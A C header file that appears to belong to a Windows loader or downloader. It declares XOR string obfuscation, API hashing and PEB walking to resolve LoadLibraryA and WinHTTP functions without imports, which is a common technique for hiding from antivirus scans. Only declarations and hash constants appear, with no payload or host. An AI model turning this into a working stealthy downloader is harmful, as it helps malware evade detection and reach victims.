#include <windows.h>
#include <winhttp.h>
#include <winternl.h>

char* XOR(char* string);
DWORD calcHash(PCSTR data);
HMODULE PEBGetAddr(DWORD64 FunctionHash);


#define LOADLIBRARYA_HASH 	104173313
#define  WINHTTPOPEN_HASH 35312021
#define  WINHTTPCONNECT_HASH 953417627
#define  WINHTTPOPENREQUEST_HASH 77227487930
#define  WINHTTPSENDREQUEST_HASH 77227544792
#define  WINHTTPRECEIVERESPONSE_HASH 6255422218049
#define  WINHTTPQUERYDATAAVAILABLE_HASH 168897050202854
#define  WINHTTPREADDATA_HASH 2860273615
#define  WINHTTPCLOSEHANDLE_HASH 77226782429




// kernel32.dll exports
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR lpcBuffer);

// winhttp exports
typedef HINTERNET(WINAPI* WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD   dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD   dwFlags);
typedef HINTERNET(WINAPI* WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR   pwszVerb, LPCWSTR   pwszObjectName, LPCWSTR   pwszVersion, LPCWSTR   pwszReferrer, LPCWSTR* ppwszAcceptTypes,DWORD     dwFlags);
typedef BOOL(WINAPI* WINHTTPSENDREQUEST)(HINTERNET hRequest, LPCWSTR   lpszHeaders, DWORD     dwHeadersLength, LPVOID    lpOptional, DWORD     dwOptionalLength, DWORD     dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(WINAPI* WINHTTPRECEIVERESPONSE)(HINTERNET hRequest, LPVOID    lpReserved);
typedef BOOL(WINAPI* WINHTTPQUERYDATAAVAILABLE)(HINTERNET hRequest, LPDWORD   lpdwNumberOfBytesAvailable);
typedef BOOL(WINAPI* WINHTTPREADDATA)(HINTERNET hRequest, LPVOID    lpBuffer, DWORD     dwNumberOfBytesToRead, LPDWORD   lpdwNumberOfBytesRead);
typedef BOOL(WINAPI* WINHTTPCLOSEHANDLE)(HINTERNET hInternet);


// Redefine PEB structures, for our own purpose
typedef struct NEW_PEB_LDR_DATA {
	ULONG Length;
	BOOL Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} NEW_PEB_LDR_DATA, * PNEW_PEB_LDR_DATA;

typedef struct _NEW_LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} NEW_LDR_DATA_TABLE_ENTRY, * PNEW_LDR_DATA_TABLE_ENTRY;

